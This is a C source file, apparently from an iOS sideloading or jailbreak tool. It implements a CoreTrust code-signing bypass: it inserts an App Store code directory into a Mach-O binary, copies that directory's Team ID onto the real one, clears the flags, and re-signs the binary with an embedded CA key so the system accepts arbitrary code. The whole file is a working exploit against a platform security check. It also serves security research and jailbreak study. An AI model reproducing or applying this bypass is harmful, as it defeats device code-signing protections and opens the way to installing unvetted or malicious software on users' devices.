#include <CoreFoundation/CoreFoundation.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include "CSBlob.h"
#include "MachOByteOrder.h"
#include "MachO.h"
#include "Host.h"
#include "MemoryStream.h"
#include "FileStream.h"
#include "BufferedStream.h"
#include "CodeDirectory.h"
#include "Base64.h"
#include "Templates/AppStoreCodeDirectory.h"
#include "Templates/DERTemplate.h"
#include "Templates/TemplateSignatureBlob.h"
#include "Templates/CADetails.h"
#include <openssl/pem.h>
#include <openssl/err.h>
#include <copyfile.h>
#include <TargetConditionals.h>
#include <openssl/cms.h>

int update_signature_blob(CS_DecodedSuperBlob *superblob)
{
    CS_DecodedBlob *sha1CD = csd_superblob_find_blob(superblob, CSSLOT_CODEDIRECTORY, NULL);
    if (!sha1CD) {
        printf("Could not find SHA1 CodeDirectory blob!\n");
        return -1;
    }
    CS_DecodedBlob *sha256CD = csd_superblob_find_blob(superblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
    if (!sha256CD) {
        printf("Could not find SHA256 CodeDirectory blob!\n");
        return -1;
    }

    uint8_t sha1CDHash[CC_SHA1_DIGEST_LENGTH];
    uint8_t sha256CDHash[CC_SHA256_DIGEST_LENGTH];

    {
        size_t dataSizeToRead = csd_blob_get_size(sha1CD);
        uint8_t *data = malloc(dataSizeToRead);
        memset(data, 0, dataSizeToRead);
        csd_blob_read(sha1CD, 0, dataSizeToRead, data);
        CC_SHA1(data, (CC_LONG)dataSizeToRead, sha1CDHash);
        free(data);
        printf("SHA1 hash: ");
        for (int i = 0; i < CC_SHA1_DIGEST_LENGTH; i++) {
            printf("%02x", sha1CDHash[i]);
        }
        printf("\n");
    }

    {
        size_t dataSizeToRead = csd_blob_get_size(sha256CD);
        uint8_t *data = malloc(dataSizeToRead);
        memset(data, 0, dataSizeToRead);
        csd_blob_read(sha256CD, 0, dataSizeToRead, data);
        CC_SHA256(data, (CC_LONG)dataSizeToRead, sha256CDHash);
        free(data);
        printf("SHA256 hash: ");
        for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
            printf("%02x", sha256CDHash[i]);
        }
        printf("\n");
    }

    const uint8_t *cmsDataPtr = AppStoreSignatureBlob + offsetof(CS_GenericBlob, data);
    size_t cmsDataSize = AppStoreSignatureBlob_len - sizeof(CS_GenericBlob);
    CMS_ContentInfo *cms = d2i_CMS_ContentInfo(NULL, (const unsigned char**)&cmsDataPtr, cmsDataSize);
    if (!cms) {
        printf("Failed to parse CMS blob: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Load private key
    FILE* privateKeyFile = fmemopen(CAKey, CAKeyLength, "r");
    if (!privateKeyFile) {
        printf("Failed to open private key file!\n");
        return -1;
    }
    EVP_PKEY* privateKey = PEM_read_PrivateKey(privateKeyFile, NULL, NULL, NULL);
    fclose(privateKeyFile);
    if (!privateKey) {
        printf("Failed to read private key file!\n");
        return -1;
    }

    // Load certificate
    FILE* certificateFile = fmemopen(CACert, CACertLength, "r");
    if (!certificateFile) {
        printf("Failed to open certificate file!\n");
        return -1;
    }
    X509* certificate = PEM_read_X509(certificateFile, NULL, NULL, NULL);
    fclose(certificateFile);
    if (!certificate) {
        printf("Failed to read certificate file!\n");
        return -1;
    }

    // Add signer
    CMS_SignerInfo* newSigner = CMS_add1_signer(cms, certificate, privateKey, EVP_sha256(), CMS_PARTIAL | CMS_REUSE_DIGEST | CMS_NOSMIMECAP);
    if (!newSigner) {
        printf("Failed to add signer: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    CFMutableArrayRef cdHashesArray = CFArrayCreateMutable(NULL, 2, &kCFTypeArrayCallBacks);
    if (!cdHashesArray) {
        printf("Failed to create CDHashes array!\n");
        return -1;
    }

    CFDataRef sha1CDHashData = CFDataCreate(NULL, sha1CDHash, CC_SHA1_DIGEST_LENGTH);
    if (!sha1CDHashData) {
        printf("Failed to create CFData from SHA1 CDHash!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFArrayAppendValue(cdHashesArray, sha1CDHashData);
    CFRelease(sha1CDHashData);

    // In this plist, the SHA256 hash is truncated to SHA1 length
    CFDataRef sha256CDHashData = CFDataCreate(NULL, sha256CDHash, CC_SHA1_DIGEST_LENGTH);
    if (!sha256CDHashData) {
        printf("Failed to create CFData from SHA256 CDHash!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFArrayAppendValue(cdHashesArray, sha256CDHashData);
    CFRelease(sha256CDHashData);
    
    CFMutableDictionaryRef cdHashesDictionary = CFDictionaryCreateMutable(NULL, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!cdHashesDictionary) {
        printf("Failed to create CDHashes dictionary!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFDictionarySetValue(cdHashesDictionary, CFSTR("cdhashes"), cdHashesArray);
    CFRelease(cdHashesArray);

    CFErrorRef error = NULL;
    CFDataRef cdHashesDictionaryData = CFPropertyListCreateData(NULL, cdHashesDictionary, kCFPropertyListXMLFormat_v1_0, 0, &error);
    CFRelease(cdHashesDictionary);
    if (!cdHashesDictionaryData) {
        // CFStringGetCStringPtr, unfortunately, does not always work
        CFStringRef errorString = CFErrorCopyDescription(error);
        CFIndex maxSize = CFStringGetMaximumSizeForEncoding(CFStringGetLength(errorString), kCFStringEncodingUTF8) + 1;
        char *buffer = (char *)malloc(maxSize);
        if (CFStringGetCString(errorString, buffer, maxSize, kCFStringEncodingUTF8)) {
            printf("Failed to encode CDHashes plist: %s\n", buffer);
        } else {
            printf("Failed to encode CDHashes plist: unserializable error\n");
        }
        free(buffer);
        return -1;
    }

    // Add text CDHashes attribute
    if (!CMS_signed_add1_attr_by_txt(newSigner, "1.2.840.113635.100.9.1", V_ASN1_OCTET_STRING, CFDataGetBytePtr(cdHashesDictionaryData), CFDataGetLength(cdHashesDictionaryData))) {
        printf("Failed to add text CDHashes attribute: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Create DER-encoded CDHashes (see DERTemplate.h for details)
    uint8_t cdHashesDER[78];
    memset(cdHashesDER, 0, sizeof(cdHashesDER));
    memcpy(cdHashesDER, CDHashesDERTemplate, sizeof(CDHashesDERTemplate));
    memcpy(cdHashesDER + CDHASHES_DER_SHA1_OFFSET, sha1CDHash, CC_SHA1_DIGEST_LENGTH);
    memcpy(cdHashesDER + CDHASHES_DER_SHA256_OFFSET, sha256CDHash, CC_SHA256_DIGEST_LENGTH);

    // Add DER CDHashes attribute
    if (!CMS_signed_add1_attr_by_txt(newSigner, "1.2.840.113635.100.9.2", V_ASN1_SEQUENCE, cdHashesDER, sizeof(cdHashesDER))) {
        printf("Failed to add CDHashes attribute: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Sign the CMS structure
    if (!CMS_SignerInfo_sign(newSigner)) {
        printf("Failed to sign CMS structure: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Encode the CMS structure into DER
    uint8_t *newCMSData = NULL;
    int newCMSDataSize = i2d_CMS_ContentInfo(cms, &newCMSData);
    if (newCMSDataSize <= 0) {
        printf("Failed to encode CMS structure: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Copy CMS data into a new blob
    uint32_t newCMSDataBlobSize = sizeof(CS_GenericBlob) + newCMSDataSize;
    CS_GenericBlob *newCMSDataBlob = malloc(newCMSDataBlobSize);
    newCMSDataBlob->magic = HOST_TO_BIG(CSMAGIC_BLOBWRAPPER);
    newCMSDataBlob->length = HOST_TO_BIG(newCMSDataBlobSize);
    memcpy(newCMSDataBlob->data, newCMSData, newCMSDataSize);
    free(newCMSData);

    // Remove old signature blob if it exists
    CS_DecodedBlob *oldSignatureBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
    if (oldSignatureBlob) {
        csd_superblob_remove_blob(superblob, oldSignatureBlob);
        csd_blob_free(oldSignatureBlob);
    }

    // Append new signature blob
    CS_DecodedBlob *signatureBlob = csd_blob_init(CSSLOT_SIGNATURESLOT, newCMSDataBlob);
    free(newCMSDataBlob);

    // Append new signature blob
    return csd_superblob_append_blob(superblob, signatureBlob);
}

int apply_coretrust_bypass(const char *machoPath)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;

    if (macho_is_encrypted(macho)) {
        printf("Error: MachO is encrypted, please use a decrypted app!\n");
        macho_free(macho);
        return 2;
    }

    if (macho->machHeader.filetype == MH_OBJECT) {
        printf("Error: MachO is an object file, please use a MachO executable or dynamic library!\n");
        macho_free(macho);
        return 3;
    }

    if (macho->machHeader.filetype == MH_DSYM) {
        printf("Error: MachO is a dSYM file, please use a MachO executable or dynamic library!\n");
        macho_free(macho);
        return 3;
    }
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
    free(superblob);

    CS_DecodedBlob *realCodeDirBlob = NULL;
    CS_DecodedBlob *mainCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    CS_DecodedBlob *alternateCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);

    CS_DecodedBlob *entitlementsBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS, NULL);
    CS_DecodedBlob *derEntitlementsBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS, NULL);

    if (!entitlementsBlob && !derEntitlementsBlob && macho->machHeader.filetype == MH_EXECUTE) {
        printf("Warning: Unable to find existing entitlements blobs in executable MachO.\n");
    }

    if (!mainCodeDirBlob) {
        printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed.\n");
        return -1;
    }

    // We need to determine which code directory to transfer to the new binary
    if (alternateCodeDirBlob) {
        // If an alternate code directory exists, use that and remove the main one from the superblob
        realCodeDirBlob = alternateCodeDirBlob;
        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirBlob);
        csd_blob_free(mainCodeDirBlob);
    }
    else {
        // Otherwise use the main code directory
        realCodeDirBlob = mainCodeDirBlob;
    }

    if (csd_code_directory_get_hash_type(realCodeDirBlob) != CS_HASHTYPE_SHA256_256) {
        printf("Error: Alternate code directory is not SHA256, bypass won't work!\n");
        return -1;
    }

    printf("Applying App Store code directory...\n");

    // Append real code directory as alternateCodeDirectory at the end of superblob
    csd_superblob_remove_blob(decodedSuperblob, realCodeDirBlob);
    csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);

    // Insert AppStore code directory as main code directory at the start
    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
    csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);

    printf("Adding new signature blob...\n");
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (signatureBlob) {
        // Remove existing signatureBlob if existant
        csd_superblob_remove_blob(decodedSuperblob, signatureBlob);
        csd_blob_free(signatureBlob);
    }

    // After Modification:
    // 1. App Store CodeDirectory (SHA1)
    // ?. Requirements
    // ?. Entitlements
    // ?. DER entitlements
    // 5. Actual CodeDirectory (SHA256)

    printf("Updating TeamID...\n");

    // Get team ID from AppStore code directory
    // For the bypass to work, both code directories need to have the same team ID
    char *appStoreTeamID = csd_code_directory_copy_team_id(appStoreCodeDirectoryBlob, NULL);
    if (!appStoreTeamID) {
        printf("Error: Unable to determine AppStore Team ID\n");
        return -1;
    }

    // Set the team ID of the real code directory to the AppStore one
    if (csd_code_directory_set_team_id(realCodeDirBlob, appStoreTeamID) != 0) {
        printf("Error: Failed to set Team ID\n");
        return -1;
    }

    printf("TeamID set to %s!\n", appStoreTeamID);
    free(appStoreTeamID);

    // Set flags to 0 to remove any problematic flags (such as the 'adhoc' flag in bit 2)
    csd_code_directory_set_flags(realCodeDirBlob, 0);

    int ret = 0;

    // 6. Signature blob
    printf("Doing initial signing to calculate size...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding unsigned superblob...\n");
    CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);

    printf("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, originalCodeSignatureSize, memory_stream_get_size(macho->stream)) != 0) {
        printf("Error: failed to update load commands!\n");
        return -1;
    }
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    csd_code_directory_update(realCodeDirBlob, macho);

    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding signed superblob...\n");
    CS_SuperBlob *newSuperblob = csd_superblob_encode(decodedSuperblob);

    printf("Writing superblob to MachO...\n");
    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    csd_superblob_free(decodedSuperblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}